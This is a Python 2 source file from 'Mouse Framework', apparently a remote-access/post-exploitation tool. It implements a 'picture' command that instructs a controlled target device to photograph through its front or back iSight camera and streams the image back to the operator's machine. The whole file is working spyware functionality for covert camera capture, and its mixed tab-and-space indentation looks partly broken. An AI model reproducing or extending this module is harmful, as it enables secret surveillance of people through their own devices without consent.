#!/usr/bin/env python

#            ---------------------------------------------------
#                              Mouse Framework                                 
#            ---------------------------------------------------
#                Copyright (C) <2019-2020>  <Entynetproject>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

import json, time, binascii, os
import core.helper as h

class command:
    def __init__(self):
        self.name = "picture"
        self.description = "Take picture through iSight."
        self.type = "native"
        self.usage = "Usage: picture [front|back] <local_path>"

    def run(self,session,cmd_data):
		if len(cmd_data['args'].split()) < 2 or (cmd_data['args'].split()[0] != "front" and cmd_data['args'].split()[0] != "back"):
			print self.usage
			return
		
		dest = cmd_data['args'].split()[1]
		cmd_data['args'] = cmd_data['args'].split()[0]
                if os.path.isdir(dest):
                    if os.path.exists(dest):
			 if cmd_data['args'] == "back":
		             cmd_data['args'] = False
		         else:
			     cmd_data['args'] = True
		         h.info_general("Taking picture...")
			 try:
			     response = json.loads(session.send_command(cmd_data))
			     if 'success' in response:
			         size = int(response["size"])
				 data = session.sock_receive_data(size)
				 f = open(os.path.join(dest,'picture.jpg'),'w')
				 f.write(data)
				 f.close()
			     else:
				 if 'error' in response:
				     h.info_error("Failed to take picture!")
				     return
				 else:
				     h.info_error("Failed to take picture!")
				     return
		         except:
			     h.info_error("Failed to take picture!")
			     return
                         if dest[-1] == "/":
                             h.info_general("Saving to "+dest+"picture.jpg...")
                             time.sleep(1)
                             h.info_success("Saved to "+dest+"picture.jpg!")
                         else:
                             h.info_general("Saving to "+dest+"/picture.jpg...")
                             time.sleep(1)
                             h.info_success("Saved to "+dest+"/picture.jpg!")
                    else:
                        h.info_error("Local directory: "+dest+": does not exist!")
                else:
                    rp = os.path.split(dest)[0]
		    if rp == "":
			rp = "."
		    else:
			pass
                    if os.path.exists(rp):
			if os.path.isdir(rp):
			    pr = os.path.split(dest)[0]
                            rp = os.path.split(dest)[1]
                            if cmd_data['args'] == "back":
		                cmd_data['args'] = False
		            else:
			        cmd_data['args'] = True
		            h.info_general("Taking picture...")
			    try:
			        response = json.loads(session.send_command(cmd_data))
			        if 'success' in response:
			            size = int(response["size"])
				    data = session.sock_receive_data(size)
				    f = open(os.path.join(pr,rp),'w')
				    f.write(data)
				    f.close()
			        else:
				    if 'error' in response:
				        h.info_error("Failed to take picture!")
				        return
				    else:
				        h.info_error("Failed to take picture!")
				        return
		            except:
			        h.info_error("Failed to take picture!")
			        return
                            h.info_general("Saving to "+dest+"...")
                            time.sleep(1)
                            h.info_success("Saved to "+dest+"!")
                        else:
                            h.info_error("Error: "+rp+": not a directory!")
                    else:
                        h.info_error("Local directory: "+rp+": does not exist!")
